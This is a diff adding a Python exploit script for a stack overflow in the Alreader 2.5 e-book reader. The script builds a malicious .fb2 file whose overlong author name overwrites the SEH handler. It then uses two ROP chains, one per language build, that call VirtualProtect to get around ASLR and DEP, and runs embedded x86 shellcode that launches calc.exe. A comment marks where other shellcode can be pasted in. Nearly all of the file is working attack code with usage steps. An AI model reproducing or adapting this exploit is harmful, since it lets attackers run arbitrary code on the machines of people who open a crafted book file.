@@ -1,0 +1,463 @@
+#!/usr/bin/env python
+
+#*************************************************************************************************************
+# Exploit Title:          Alreader 2.5 .fb2 SEH Based Stack Overflow (ASLR and DEP bypass)
+# Date:                   25.10.2015
+# Category:               Local Exploit
+# Exploit Author:         g00dv1n
+# Contact:                g00dv1n.private@gmail.com
+# Version:                2.5
+# Tested on:              Windows XP SP3 / Windows 7 / Windows 8 
+# Vendor Homepage:        http://www.alreader.com/index.php?lang=en
+# Software Link (ENG):    http://www.alreader.com/download.php?file=AlReader2.Win32.en.zip
+# Software Link (RU):     http://www.alreader.com/download.php?file=AlReader2.Win32.ru.zip
+# CVE: 
+
+
+
+# Description:
+# Alreader 2.5 its  free FB2 reader for Windows. 
+# FB2 format its just XML. FB2 contain   <author> <first-name> </first-name>  </author>  block. 
+# Overflow occurs if you create a long name of the author.
+# App used WCHAR  (1 char - 2 bytes ). If we create file in UTF-8 then app turn every single byte into two.
+# For example 41 41  -  00 41 00 41
+# So We should use UTF-16. 
+#
+# Also, we can use single null byte in payload.
+# 
+# 
+#
+# Instructions:  
+# 1. Run this py script for generate AlReader-fb2-PoC-exploit.fb2 file.
+# 2. Run Alreader.exe
+# 3. Open AlReader-fb2-PoC-exploit.fb2 ( FILE -> Open )
+# 4. Enjoy running Calc.exe
+#
+# Exploit owerview:
+# For bypass ALSR I used a ROP style. Main module Alreader2.exe non-ALSR. It also contain calls GetModuleHandleW
+# and GetProcAdress. So using this functions I can get pointer to call VirtualProtect to make stack executable and
+# run Shellcode.
+#
+# At overflow overwritten SEH. So we can control EIP. For this spray Jump Adress in payload 
+# ( It is necessary to adjust the offset in different systems .)
+# Then to get control of the stack we need ADD to ESP some value. (ADD ESP, 808h). Then ESP will point to ROP NOP 
+# ( It is necessary to adjust the offset in different systems .)
+# Then the control get ROP chain .
+# 
+# Program have Russian (RU) and English (Eng) versions. 
+# ROP chains for them the same but different addresses. ( addresses of ADD ESP, 808h and ROP NOP same for all versions )
+# For a combination of two versions into one exploit I place two ROP chains one after another.
+# For RU version then an exception occurs, control passes first ROP chain. (ADD ESP, 808h RETN 4 then ROP NOPs )
+# For Eng version after ADD ESP, 808h RETN 4 and ROP NOPs  arises yet another exepiton and Call ADD ESP, 808h.
+# So ESP jump over first ROP chain. ROP NOP correct offset and Second ROP chain for Eng version, get control.
+# With these tricks, the exploit works correctly for both versions.
+#
+# Below is ANSI-diagram of the payload: 
+#
+#                              =-------------------------=
+#                              |          gdvn           |        just fan magic bytes       
+#                              |-------------------------|                         
+#                              |                         |
+#                              |   jmp from SEH adress   |        x 500    Spray Andress to Jump from oveeride SEH
+#                              |                         |                        (ADD ESP, 808h RETN 4) 
+#                              |-------------------------|                         
+#                              |                         |
+#                              |        ROP NOP          |        x 500    Spray  ROP NOP (RETN)   
+#                              |                         |
+#                              |-------------------------|                         
+#                              |                         |
+#                              |      ROP chain for      |
+#                              |       RU version        |
+#                              |                         |
+#                              |-------------------------|                         
+#                              |        SHELLCODE        |        Run Calc.exe
+#                              |-------------------------|                         
+#                              |                         |
+#                              |        ROP NOP          |        x 250     Spray  ROP NOP (RETN) 
+#                              |                         |
+#                              |-------------------------|                         
+#                              |                         |
+#                              |      ROP chain for      |
+#                              |       ENG version       |
+#                              |                         |
+#                              |-------------------------|                          
+#                              |        SHELLCODE        |        Run Calc.exe
+#                              |-------------------------|                         
+#                              |                         |
+#                              |      ROP chain for      |
+#                              |       ENG version       |
+#                              |                         |
+#                              |-------------------------|                          
+#                              |                         |
+#                              |                         |
+#                              |          Junk           |        'A' x 6000
+#                              |                         |                         
+#                              |                         |
+#                              =-------------------------=
+#
+#
+#
+# 
+#
+#**************************************************************************************************************
+
+
+
+
+#######################################################################################################
+from struct import *
+
+#######################################################################################################
+file_result = "AlReader-fb2-PoC-exploit.fb2"
+
+
+########################################################################################################
+
+fuz_text  = ''                                # init fuzzy string 
+
+
+
+
+jmp_to  = pack('<I',0x00442391 )              # 0x00442391 ADD ESP, 808h RETN 4
+
+ret_NOP =  pack('<I',0x00448147 )             # RETN
+
+
+##################################### START CREATE ROP CHAINs ############################################
+
+fuz_text += 'gdvn'                              # magic init bytes
+
+
+
+fuz_text += jmp_to * 500                        # spray adr
+
+
+
+fuz_text += ret_NOP * 500                       # spray RETN adr
+
+
+
+####################################### ROP CHAIN FOR RUS VERSION ########################################
+
+# Prepare to call GetModuleHandleW
+# EDI = GetModuleHandleW adr
+# ESI = ret adr 
+# EBP = ptr to unicode 'kernel32.dll'
+                  
+ret_adr_after = pack('<I',0x0048ddd1 )          # 0x0048ddd1 :  # ADD ESP,30 # RETN    ( this need to correct ESP )
+module_handlew_adr = pack('<I',0x004FC8FC )     # 0x004FC8FC GetModuleHandleW adr
+kernel32_u = pack('<I',0x0560944 )              # 0x0560944 ptr to unicode 'kernel32.dll'
+
+
+#0x004904a6 :  #  POP EDI # POP ESI # POP EBP # POP EBX # RETN 
+fuz_text +=  pack('<I',0x004904a6 )   + module_handlew_adr + ret_adr_after + kernel32_u
+
+fuz_text +=  '\x41' *  4
+
+                                                
+fuz_text +=  pack('<I',0x004f831c )             # 0x004f831c # ADD ESP,24 # RETN
+
+fuz_text +=  '\x41' *  36
+
+fuz_text += pack('<I',0x004b310d )              # 0x004b310d :  # PUSHAD # RETN
+
+fuz_text +=  '\x41' *  28                       # correct after ADD ESP,30
+
+
+#Junk
+#################################################
+fuz_text +=  pack('<I',0x004f831c )             # 0x004f831c # ADD ESP,24 # RETN
+
+fuz_text +=  '\x41' *  36
+#################################################
+
+#EAX = kernel32 base adr
+
+# Prepare to call GetProcAdress
+# EDI = GetProcAdress adr
+# ESI = ret adr 
+# EBP = kernel32 base adr
+# ESP = ptr to ANSII 'VirtualProtect00'
+
+
+ret_adr_after = pack('<I',0x0048ddd1 )          # 0x0048ddd1 :  # ADD ESP,30 # RETN    ( this need to correct ESP )             
+
+get_proc_adr  = pack('<I',0x0043C8B2 )          # 0x0043C8B2 - GetProcAdress
+
+
+# 0x004904A8 : # POP EDI # POP ESI # POP EBP # POP EBX # RETN
+
+fuz_text += pack('<I',0x004904A8 )  + get_proc_adr +  ret_adr_after           
+
+fuz_text +=  '\x41' *  8
+
+
+fuz_text += pack('<I',0x004b9e9e )             # 0x004b9e9e :  # XCHG EAX,EBP # SETE CL # MOV EAX,ECX # RETN
+
+fuz_text += pack('<I',0x004b310d )             # 0x004b310d :  # PUSHAD # RETN
+
+fuz_text += 'VirtualProtect' + '\x00'
+
+fuz_text +=  '\x41' *  17                      # correct ESP pointer 
+
+
+########################################################
+# Prepare registrs for Virtual protect call
+
+# EDI = ROP NOP
+# ESI = VirtualProtect adr 
+# EBP = Ret adr
+# ESP = auto
+# EBX = 1 
+# EDX = 0x40
+# ECX = lpOldProtect (ptr to W address)
+
+# Now in EAX VP adr 
+
+fuz_text += pack('<I',0x00489cdd )              # 0x00489cdd,  # PUSH EAX # POP ESI # RETN 
+
+fuz_text += pack('<I',0x004a6392 )              # 0x004a6392,  # POP EBX # RETN 
+
+fuz_text += pack('<I',0x5DE58BD1 )              # 0x5DE58BD0,  # EBX = 5DE58BD1
+
+fuz_text += pack('<I',0x004e7d31 )              # 0x004e7d31,  # SUB EBX,5DE58BD0 # RETN # EBX = 1
+
+fuz_text += pack('<I',0x004fc23c )              # 0x004fc23c,  # XOR EDX,EDX # RETN  # EDX = 0
+
+fuz_text += pack('<I',0x0040db04 )  * 64        # 0x0040db04,  # INC EDX # ADD AL,3B # RETN x 64 # EDX = 0x40
+
+fuz_text += pack('<I',0x0048c064 )              # 0x0048c064,  # POP ECX # RETN 
+
+fuz_text += pack('<I',0x00629eea )              # 0x00629eea,  # &Writable location 
+
+fuz_text += pack('<I',0x00487d6a )              # 0x00487d6a,  # POP EDI # RETN 
+
+fuz_text += pack('<I',0x004f4401 )              # 0x004f4401,  # RETN (ROP NOP)
+
+
+
+fuz_text += pack('<I',0x004e6379 )              # 0x004e6379,  # POP EBP # RETN 
+
+ret_adr_after = pack('<I',0x004f831c )          # ret adr  #  0x004f831c # ADD ESP,24 # RETN
+
+
+fuz_text += ret_adr_after
+
+fuz_text+= pack('<I',0x004ecfab )               # 0x004ecfab,  # PUSHAD # RETN 
+
+fuz_text +=  '\x41' *  32                       # Correct poiter to ESP
+
+
+
+fuz_text += pack('<I',0x004a37bd )              # 0x004a37bd : # jmp esp 
+
+fuz_text += '\x90' * 16                         # NOP's :-)
+
+
+##################################### END ROP CHAIN #########################################
+
+#############################################################################################
+#PASTE SHELLCODE HERE
+
+
+
+
+# Run Calc
+shellcode = ("\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
+"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
+"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
+"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
+"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
+"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
+"\x45\x81\x3e\x43\x72\x65\x61\x75"
+"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
+"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
+"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
+"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
+"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
+"\x6c\x63\x89\xe2\x52\x52\x53\x53"
+"\x53\x53\x53\x53\x52\x53\xff\xd7");
+
+
+fuz_text += shellcode
+
+
+############################################################################################# 
+fuz_text += ret_NOP * 250                       # spray RETN adr
+
+#############################################################################################
+
+############################### ROP CHAIN FOR ENG VERSION ###################################
+
+
+
+
+
+
+
+# Prepare to call GetModuleHandleW
+# EDI = GetModuleHandleW adr
+# ESI = ret adr 
+# EBP = ptr to unicode 'kernel32.dll'
+                  
+ret_adr_after = pack('<I',0x004cad21 )          # 0x004cad21 :  # ADD ESP,30 # RETN    ( this need to correct ESP )
+module_handlew_adr = pack('<I',0x004FC85C )     # 0x004FC85C GetModuleHandleW adr
+kernel32_u = pack('<I',0x00560724 )              # 0x00560724  ptr to unicode 'kernel32.dll'
+
+
+#0x00488ed6 :  # POP EDI # POP ESI # POP EBP # POP EBX # RETN 
+fuz_text +=  pack('<I',0x00488ed6 )   + module_handlew_adr + ret_adr_after + kernel32_u
+
+fuz_text +=  '\x41' *  4
+
+                                                
+fuz_text +=  pack('<I',0x004a8ee8 )             # 0x004a8ee8 # ADD ESP,24 # RETN
+
+fuz_text +=  '\x41' *  36
+
+fuz_text += pack('<I',0x004b3ded )              # 0x004b3ded :  # PUSHAD # RETN
+
+fuz_text +=  '\x41' *  28                       # correct after ADD ESP,30
+
+
+#Junk
+#################################################
+fuz_text +=  pack('<I',0x004a8ee8 )             # 0x004a8ee8 # ADD ESP,24 # RETN
+
+fuz_text +=  '\x41' *  36
+#################################################
+
+#EAX = kernel32 base adr
+
+# Prepare to call GetProcAdress
+# EDI = GetProcAdress adr
+# ESI = ret adr 
+# EBP = kernel32 base adr
+# ESP = ptr to ANSII 'VirtualProtect00'
+
+
+ret_adr_after = pack('<I',0x004cad21 )          # 0x004cad21 :  # ADD ESP,30 # RETN    ( this need to correct ESP )             
+
+get_proc_adr  = pack('<I',0x0043C8B2 )          # 0x0043C8B2 - GetProcAdress
+
+
+# 0x00488ed6 : # POP EDI # POP ESI # POP EBP # POP EBX # RETN
+
+fuz_text += pack('<I',0x00488ed6 )  + get_proc_adr +  ret_adr_after           
+
+fuz_text +=  '\x41' *  8
+
+
+fuz_text += pack('<I',0x004b9dfe )             # 0x004b9dfe :  # XCHG EAX,EBP # SETE CL # MOV EAX,ECX # RETN
+
+fuz_text += pack('<I',0x004b3ded )             # 0x004b3ded :  # PUSHAD # RETN
+
+fuz_text += 'VirtualProtect' + '\x00'
+
+fuz_text +=  '\x41' *  17                      # correct ESP pointer 
+
+
+########################################################
+# Prepare registrs for Virtual protect call
+
+# EDI = ROP NOP
+# ESI = VirtualProtect adr 
+# EBP = Ret adr
+# ESP = auto
+# EBX = 1 
+# EDX = 0x40
+# ECX = lpOldProtect (ptr to W address)
+
+# Now in EAX VP adr 
+
+fuz_text += pack('<I',0x00489c3d )              # 0x00489c3d,  # PUSH EAX # POP ESI # RETN 
+
+fuz_text += pack('<I',0x00481c40 )              # 0x00481c40,  # POP EBX # RETN 
+
+fuz_text += pack('<I',0x5DE58BD1 )              # 0x5DE58BD0,  # EBX = 5DE58BD1
+
+fuz_text += pack('<I',0x004e7c91 )              # 0x004e7c91,  # SUB EBX,5DE58BD0 # RETN # EBX = 1
+
+fuz_text += pack('<I',0x004fc19c )              # 0x004fc19c,  # XOR EDX,EDX # RETN 
+
+fuz_text += pack('<I',0x0040db04 )  * 64        # 0x0040db04,  # INC EDX # ADD AL,3B # RETN x 64 # EDX = 0x40
+
+fuz_text += pack('<I',0x004f39dc )              # 0x004f39dc,  # POP ECX # RETN 
+
+fuz_text += pack('<I',0x0062909d )              # 0x0062909d,  # &Writable location 
+
+fuz_text += pack('<I',0x00495df4 )              # 0x00495df4,  # POP EDI # RETN 
+
+fuz_text += pack('<I',0x00483a02 )              # 0x00483a02,  # RETN (ROP NOP)
+
+
+
+fuz_text += pack('<I',0x004fb3c6 )              # 0x004fb3c6,  # POP EBP # RETN 
+
+ret_adr_after = pack('<I',0x004a8ee8 )          # ret adr  #  0x004a8ee8 # ADD ESP,24 # RETN
+
+
+fuz_text += ret_adr_after
+
+fuz_text+= pack('<I',0x004b3ded )               # 0x004b3ded,  # PUSHAD # RETN 
+
+fuz_text +=  '\x41' *  32                       # Correct poiter to ESP
+
+
+
+fuz_text += pack('<I',0x004757a7  )              # 0x004757a7  : # jmp esp 
+
+fuz_text += '\x90' * 16                         # NOP's :-)
+
+
+fuz_text += shellcode
+
+
+
+
+
+
+
+
+##############################################################################################
+fuz_text += '\x41' * 6000                       # final junk
+
+
+################################ GENERATE utf-16 fb2 file ####################################
+
+start = '''
+<?xml version="1.0" encoding="unicode-utf_16"?>
+<FictionBook xmlns="http://www.gribuser.ru/xml/fictionbook/2.0" xmlns:l="http://www.w3.org/1999/xlink">
+  <description>
+    <title-info>
+      <author>
+        <first-name> 
+    '''
+
+end   = '''
+   <middle-name/>
+        <last-name/>
+      </author>
+      <book-title>EXPLOIT TEST</book-title>
+	 </title-info>
+    </description>
+</FictionBook>
+'''
+start_u = start.encode('utf-16')
+
+end_u = end.encode('utf-16')
+
+fout = open(file_result, 'wb')
+fout.write(start_u)
+fout.close()
+
+fout = open(file_result,'ab')
+fout.write(fuz_text)
+fout.close()
+
+fout = open(file_result,'ab')
+fout.write(end_u)
+fout.close()
+
+
+print "[*] File successfully created !!\n\n"
